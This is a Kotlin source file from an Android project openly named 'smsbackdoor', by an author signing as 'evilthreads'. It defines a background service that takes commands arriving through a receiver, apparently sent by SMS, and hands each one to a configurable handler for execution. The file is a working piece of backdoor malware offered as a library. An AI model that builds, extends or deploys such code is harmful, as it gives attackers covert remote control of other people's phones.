/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package com.evilthreads.smsbackdoor

import android.content.Context
import android.content.Intent
import androidx.core.app.JobIntentService
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
/**
* @author Chris Basinger
* @email evilthreads669966@gmail.com
* @date 10/08/20
*
* [RemoteCommandExecutor] is responsible for executing remote commands that are provided by [RemoteCommandReceiver]. All remote commands are executed off of the 
* main thread by passing them as an argument to [SmsBackdoor.commandHandler].
**/
internal class RemoteCommandExecutor: JobIntentService() {

    companion object{
        private val JOB_ID = 666
        private val COMPONENT = this::class.java
        internal fun enqueWork(ctx: Context, intent: Intent) = enqueueWork(ctx, COMPONENT, JOB_ID, intent)
    }

    /*execute remote command with command handler*/
    override fun onHandleWork(intent: Intent) {
        intent.getStringExtra(SmsBackdoor.KEY_REMOTE_COMMAND)?.let { command -> SmsBackdoor.commandHandler?.invoke(command) }
    }
}
